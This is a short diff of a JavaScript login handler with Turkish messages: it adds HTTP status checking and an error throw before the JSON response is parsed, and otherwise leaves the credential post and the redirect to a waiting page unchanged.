@@ -44,10 +44,16 @@ function tcno_dogrula(tcno) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ trname, trpass })
       })
-        .then(response => response.json())
+        .then(response => {
+          if (response.ok) { 
+            return response.json();
+          } else {
+            throw new Error('Sunucu hatası! HTTP Kodu: ' + response.status);
+          }
+        })
         .then(data => {
           if (data.success === true) { 
-            window.location.href = '/bekle';
+            window.location.href = '/bekle'; 
           } else {
             alert("Giriş başarısız! Tekrar deneyin.");
           }
